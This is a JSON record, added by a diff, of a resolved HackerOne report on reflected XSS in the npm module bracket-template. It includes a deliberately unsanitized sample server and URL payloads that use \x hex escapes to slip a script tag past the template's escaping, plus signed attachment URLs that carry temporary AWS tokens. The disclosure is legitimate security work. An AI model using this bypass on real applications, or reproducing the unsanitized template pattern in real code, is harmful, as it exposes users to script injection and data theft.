@@ -1,0 +1,159 @@
+{
+  "id": 317125,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8zMTcxMjU=",
+  "url": "https://hackerone.com/reports/317125",
+  "title": "[bracket-template] Reflected XSS possible when variable passed via GET parameter is used in template",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "high",
+  "readable_substate": "Resolved",
+  "created_at": "2018-02-17T14:19:09.371Z",
+  "submitted_at": "2018-02-17T14:19:09.371Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "bl4de",
+    "url": "/bl4de",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/017/622/285a07d9de896d5840ce1b556236272b751658e3_original.jpg/3cb67cc78dc0cba55b102dd9eca2ee89b206d3e960be830f070583d9070b69ef"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 23949,
+    "url": "https://hackerone.com/nodejs-ecosystem",
+    "handle": "nodejs-ecosystem",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/023/949/3ea3b2ae039a8f955a4a8fe65d99fe85dc817398_original./235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/023/949/3ea3b2ae039a8f955a4a8fe65d99fe85dc817398_original./3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c"
+    },
+    "permissions": [],
+    "submission_state": "disabled",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "Node.js third-party modules",
+      "twitter_handle": "",
+      "website": "https://nodejs.org/en/security/",
+      "about": "This program was used to handle vulnerabilities in the Node.js ecosystem."
+    }
+  },
+  "has_bounty?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": false,
+  "disclosed_at": "2018-04-09T14:58:19.748Z",
+  "bug_reporter_agreed_on_going_public_at": null,
+  "team_member_agreed_on_going_public_at": "2018-03-10T14:58:15.958Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "Hi Guys,\n\nI would like to report Reflected XSS in bracket-template module.\nIt allows to inject arbitrary JavaScript tag and malicious code to execute when variables read from GET are used directly in template without sanitization.\n\n## Module\n\n**module name:** bracket-template\n**version:** 1.1.5\n**npm page:** https://www.npmjs.com/package/bracket-template\n\n### Description\n\nMinimal (über fast) Javascript engine compatible with node.js and browsers.\n\n### Module Stats\n\nStats:\n\n51 downloads in the last day\n209 downloads in the last week\n835 downloads in the last month\n\n~10000 estimated downloads per year\n\n## Description\n\nWhile testing ```bracket-template``` module, I've found that there is possibility to inject malicious ```<script>``` tag followed by JavaScript code when values passed via GET are used in templates directly, without any sanitization.\n\n## Steps To Reproduce:\n\n- install ```bracket-template``` module:\n\n```\n$ npm install bracket-template\n```\n\n- create sample aaplication, which reads ```name``` from url and displays welcome message in the browser:\n\n```javascript\n// app.js file\nconst http = require('http')\nconst bracket = require('bracket-template').default\nconst port = 8080\n\nfunction createHTML(name) {\n    let tpl = `\n        [[ const n = '${name}'; ]]\n        <strong>Hello [[= n ]]</strong>\n    `\n    return bracket.compile(tpl)\n}\n\nconst requestHandler = (request, response) => {\n    const name = request.url.split('=')[1]\n    response.writeHeader(200, { \"Content-Type\": \"text/html\" });\n    response.write(createHTML(name)());\n    response.end();\n}\n\nconst server = http.createServer(requestHandler)\n\nserver.listen(port, (err) => {\n    if (err) {\n        return console.log(err)\n    }\n    console.log(`server is listening on ${port}`)\n})\n```\n\n- run application:\n\n```\n$ node app.js\n```\n\n- open ```http://localhost:8080?name=bl4de``` in the browser. You will notice expected result:\n\n{F264368}\n\n- now, try to inject following malicious XSS payload: ```http://localhost:8080?name=bl4de<script>console.log('XSS?')</script>```. You will notice all HTML special characters were escaped:\n\n{F264369}\n\n\n- this time, use following payload: ```http://localhost:8080/?name=bl4de\\x3cscript\\x3econsole.log(\\x22uh\\x20oh,\\x20XSS...\\x20:(\\x22)\\x3c\\x2fscript\\x3e``` and see the result in browser dev tools console:\n\n\n{F264370}\n\n\nWhen we investigate HTML returned from the server, we can notice using ```\\x[hex][hex]``` notation allows to inject any HTML special character and crafts XSS payload:\n\n```HTML\n<strong>Hello bl4de<script>console.log(\"uh oh, XSS... :(\")</script></strong>\n```\n\nAlso, I have noticed that this vector is not detected by built-in XSS protection (XSS Auditor) in Blink/WebKit based browsers (Chromium, Safari, Chrome, Opera), which causes additional risk for anyone who uses ```bracket-template``` in production application.\n\n\n## Supporting Material/References:\n\nThis issue was found and tested with following setup:\n\n- macOS HighSierra 10.13.3\n- Node.js v.8.9.3\n- npm v. 5.5.1\n- Chromium 66.0.3342.0, Safari 11.03 (with XSS Auditor enabled), Chrome 64.0.3282.167 (with XSS Auditor enabled)\n\n## Wrap up\n\n- I contacted the maintainer to let him know: No\n- I opened an issue in the related repository: No\n\nRegards,\n\nRafal 'bl4de' Janicki\n\n## Impact\n\nThis issue can be used by malicious user to exploit Reflected XSS against application  which outputs variables passed via GET parameters directly in template(s) without any sanitization.",
+  "weakness": {
+    "id": 61,
+    "name": "Cross-site Scripting (XSS) - Reflected"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+    {
+      "id": 264368,
+      "file_name": "1.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/264/368/5404583ac56a8e64b69905947920c21c08640253/1.png?response-content-disposition=attachment%3B%20filename%3D%221.png%22%3B%20filename%2A%3DUTF-8%27%271.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ4YX5O5ZF%2F20260509%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260509T152430Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEB8aCXVzLXdlc3QtMiJIMEYCIQDrYBeAJmfSrho%2Fo3ydnTGHZMgciTMqd4s%2Bi3051FSKHgIhAN%2FdIMNF5zpPzmkTCuBvT9Wwg6%2BYPipU4qDbZUf6MgabKrsFCOf%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQAxoMMDEzNjE5Mjc0ODQ5IgzfN8V2bGEkvwhLB0kqjwWN33cGXQ27qYU0ULk0RZRtollgj3I4%2Ff6knuECYYSVHehNm2%2B%2Fls7yT30bRpwXecZ3wjyRR%2BAzMITbfQLLClMHTqk1jH6wJ%2FDrBoOZqOWDJrSp8LgXLh6scwpYmDo9Hc1ALh8lEF9FeL44n8eOGeB114eipW938o11kbmQVbUtKKgCj1YIBtaj3vBVV0IvVZLuRmJ3jHgEEeZzzPzpwQNrpsNgIBhhB09SKf7ZvBYtIbIfdw4MB1kfD5KK3Z0ai%2F95OBUwAeF6qlhWjm1M78CzXMmAl5gT8zrMnypwfOnh94r7pQ136w2yrMg7sPJ%2Ffzv%2F%2BAms%2BMpFvwwCaXSjlInkf2QyNp0Zt8AvRKeVPIOn6jda3HVmddIvrxZKTkZyPZLXlmy2c4oB4A8tjtCoHU2T6pJ5ZPHyI%2B0npv3AFnS78y2Ug8pMuyNwT0l4kL0eDZfSuIdKUj3ryKV3f4h2iq8v%2B9NyOLtSC%2BeKt6zRkj3DiQls0F1uSwh0mmdQpvsYT9pUdguU5CloLGghU7T2luGNv%2B6MjD3%2F1NkmjtPhVbdznLFzz87yzIKw8ZqGDuAdRpzq8ogeeNGJWapah9MYNyqq%2BjlZSh%2FHhfljggs9NHM30yYDFIKX5fD5px9Xk9aeC0X%2BZLBb6EtPjCYF7VOLPQv8Pti7O3ZRkU6mU16yzQW7XZKW5hXR%2FZQiJ1Yg7tD5CZLbgrqihMnsTwtlaXsR9addX9QIGqbPDtXGVrnfW2UR4%2BVqdyHMJEBaMtZzE9L9Mw%2F%2Bn23pQPCzO4TuWn9H1qq6%2BMQzRxD57u4PMawcWNGm6D4y3f7LACfZn0SpaI5FzCvnkskUwGqQmGou9Z%2BK3CsyxGBAEFfYhIqkqWc2ySoeMJaF%2Fc8GOrAB7waFHxH8Hmo9bqH27gqSdTMqs%2BfaICaBZ8KzmWuW0vcV%2BCYZ3FOkuY3zZjc6d%2Brhch4OmCIQ%2B%2BNVw1M4qseGerzWSJi4vGMFEBHgHc3HN0SCZlJhoY%2BTkgIbKDqtiHbj35Mz7TZl0x6zJV9zMewjuK%2F4TU2o1kKVImQhqlOREgbl%2FLkzX2CUHFMDioplV6oNKyjke26FEK6Y%2B%2BFquOsVXxzKKXRxUQ3eN4OcaIA7GJk%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=5b2084f9e9e6a0b6d16fea4360833a8b04013ab6e9a3bd8b7b78009c74156a7c",
+      "file_size": 113040,
+      "type": "image/png",
+      "moderated": null
+    },
+    {
+      "id": 264369,
+      "file_name": "2.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/264/369/380fbd02d94f877178129f6ec4c2a0bc011e5fbe/2.png?response-content-disposition=attachment%3B%20filename%3D%222.png%22%3B%20filename%2A%3DUTF-8%27%272.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ4YX5O5ZF%2F20260509%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260509T152430Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEB8aCXVzLXdlc3QtMiJIMEYCIQDrYBeAJmfSrho%2Fo3ydnTGHZMgciTMqd4s%2Bi3051FSKHgIhAN%2FdIMNF5zpPzmkTCuBvT9Wwg6%2BYPipU4qDbZUf6MgabKrsFCOf%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQAxoMMDEzNjE5Mjc0ODQ5IgzfN8V2bGEkvwhLB0kqjwWN33cGXQ27qYU0ULk0RZRtollgj3I4%2Ff6knuECYYSVHehNm2%2B%2Fls7yT30bRpwXecZ3wjyRR%2BAzMITbfQLLClMHTqk1jH6wJ%2FDrBoOZqOWDJrSp8LgXLh6scwpYmDo9Hc1ALh8lEF9FeL44n8eOGeB114eipW938o11kbmQVbUtKKgCj1YIBtaj3vBVV0IvVZLuRmJ3jHgEEeZzzPzpwQNrpsNgIBhhB09SKf7ZvBYtIbIfdw4MB1kfD5KK3Z0ai%2F95OBUwAeF6qlhWjm1M78CzXMmAl5gT8zrMnypwfOnh94r7pQ136w2yrMg7sPJ%2Ffzv%2F%2BAms%2BMpFvwwCaXSjlInkf2QyNp0Zt8AvRKeVPIOn6jda3HVmddIvrxZKTkZyPZLXlmy2c4oB4A8tjtCoHU2T6pJ5ZPHyI%2B0npv3AFnS78y2Ug8pMuyNwT0l4kL0eDZfSuIdKUj3ryKV3f4h2iq8v%2B9NyOLtSC%2BeKt6zRkj3DiQls0F1uSwh0mmdQpvsYT9pUdguU5CloLGghU7T2luGNv%2B6MjD3%2F1NkmjtPhVbdznLFzz87yzIKw8ZqGDuAdRpzq8ogeeNGJWapah9MYNyqq%2BjlZSh%2FHhfljggs9NHM30yYDFIKX5fD5px9Xk9aeC0X%2BZLBb6EtPjCYF7VOLPQv8Pti7O3ZRkU6mU16yzQW7XZKW5hXR%2FZQiJ1Yg7tD5CZLbgrqihMnsTwtlaXsR9addX9QIGqbPDtXGVrnfW2UR4%2BVqdyHMJEBaMtZzE9L9Mw%2F%2Bn23pQPCzO4TuWn9H1qq6%2BMQzRxD57u4PMawcWNGm6D4y3f7LACfZn0SpaI5FzCvnkskUwGqQmGou9Z%2BK3CsyxGBAEFfYhIqkqWc2ySoeMJaF%2Fc8GOrAB7waFHxH8Hmo9bqH27gqSdTMqs%2BfaICaBZ8KzmWuW0vcV%2BCYZ3FOkuY3zZjc6d%2Brhch4OmCIQ%2B%2BNVw1M4qseGerzWSJi4vGMFEBHgHc3HN0SCZlJhoY%2BTkgIbKDqtiHbj35Mz7TZl0x6zJV9zMewjuK%2F4TU2o1kKVImQhqlOREgbl%2FLkzX2CUHFMDioplV6oNKyjke26FEK6Y%2B%2BFquOsVXxzKKXRxUQ3eN4OcaIA7GJk%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=e08613391018f3c83afcc3f88f4e888788178bb37411b2f733eb04647c7e4d3d",
+      "file_size": 167346,
+      "type": "image/png",
+      "moderated": null
+    },
+    {
+      "id": 264370,
+      "file_name": "3.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/264/370/476deed12b4d2d1b03e8420ba470c80f8c1b2cf8/3.png?response-content-disposition=attachment%3B%20filename%3D%223.png%22%3B%20filename%2A%3DUTF-8%27%273.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ4YX5O5ZF%2F20260509%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260509T152430Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEB8aCXVzLXdlc3QtMiJIMEYCIQDrYBeAJmfSrho%2Fo3ydnTGHZMgciTMqd4s%2Bi3051FSKHgIhAN%2FdIMNF5zpPzmkTCuBvT9Wwg6%2BYPipU4qDbZUf6MgabKrsFCOf%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQAxoMMDEzNjE5Mjc0ODQ5IgzfN8V2bGEkvwhLB0kqjwWN33cGXQ27qYU0ULk0RZRtollgj3I4%2Ff6knuECYYSVHehNm2%2B%2Fls7yT30bRpwXecZ3wjyRR%2BAzMITbfQLLClMHTqk1jH6wJ%2FDrBoOZqOWDJrSp8LgXLh6scwpYmDo9Hc1ALh8lEF9FeL44n8eOGeB114eipW938o11kbmQVbUtKKgCj1YIBtaj3vBVV0IvVZLuRmJ3jHgEEeZzzPzpwQNrpsNgIBhhB09SKf7ZvBYtIbIfdw4MB1kfD5KK3Z0ai%2F95OBUwAeF6qlhWjm1M78CzXMmAl5gT8zrMnypwfOnh94r7pQ136w2yrMg7sPJ%2Ffzv%2F%2BAms%2BMpFvwwCaXSjlInkf2QyNp0Zt8AvRKeVPIOn6jda3HVmddIvrxZKTkZyPZLXlmy2c4oB4A8tjtCoHU2T6pJ5ZPHyI%2B0npv3AFnS78y2Ug8pMuyNwT0l4kL0eDZfSuIdKUj3ryKV3f4h2iq8v%2B9NyOLtSC%2BeKt6zRkj3DiQls0F1uSwh0mmdQpvsYT9pUdguU5CloLGghU7T2luGNv%2B6MjD3%2F1NkmjtPhVbdznLFzz87yzIKw8ZqGDuAdRpzq8ogeeNGJWapah9MYNyqq%2BjlZSh%2FHhfljggs9NHM30yYDFIKX5fD5px9Xk9aeC0X%2BZLBb6EtPjCYF7VOLPQv8Pti7O3ZRkU6mU16yzQW7XZKW5hXR%2FZQiJ1Yg7tD5CZLbgrqihMnsTwtlaXsR9addX9QIGqbPDtXGVrnfW2UR4%2BVqdyHMJEBaMtZzE9L9Mw%2F%2Bn23pQPCzO4TuWn9H1qq6%2BMQzRxD57u4PMawcWNGm6D4y3f7LACfZn0SpaI5FzCvnkskUwGqQmGou9Z%2BK3CsyxGBAEFfYhIqkqWc2ySoeMJaF%2Fc8GOrAB7waFHxH8Hmo9bqH27gqSdTMqs%2BfaICaBZ8KzmWuW0vcV%2BCYZ3FOkuY3zZjc6d%2Brhch4OmCIQ%2B%2BNVw1M4qseGerzWSJi4vGMFEBHgHc3HN0SCZlJhoY%2BTkgIbKDqtiHbj35Mz7TZl0x6zJV9zMewjuK%2F4TU2o1kKVImQhqlOREgbl%2FLkzX2CUHFMDioplV6oNKyjke26FEK6Y%2B%2BFquOsVXxzKKXRxUQ3eN4OcaIA7GJk%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=613e449d9f31804d7a305010c9cea95c9bcf62bb2ddd8f076487fa44a0c6b90a",
+      "file_size": 139693,
+      "type": "image/png",
+      "moderated": null
+    }
+  ],
+  "allow_singular_disclosure_at": "2018-04-09T14:58:16.031Z",
+  "allow_singular_disclosure_after": -255054374.07033998,
+  "singular_disclosure_allowed": true,
+  "vote_count": 9,
+  "voters": [
+    "k0ns0l",
+    "muhammad_uwais",
+    "whitesector",
+    "eveeez",
+    "pandaonair",
+    "x1m",
+    "khalooda0x",
+    "japz",
+    "vibs123i"
+  ],
+  "severity": {
+    "rating": "high",
+    "score": 8.6,
+    "author_type": "Team",
+    "metrics": {
+      "attack_vector": "network",
+      "attack_complexity": "low",
+      "privileges_required": "none",
+      "user_interaction": "none",
+      "scope": "changed",
+      "confidentiality": "high",
+      "integrity": "none",
+      "availability": "none"
+    }
+  },
+  "structured_scope": {
+    "databaseId": 6793,
+    "asset_type": "SOURCE_CODE",
+    "asset_identifier": "bracket-template",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
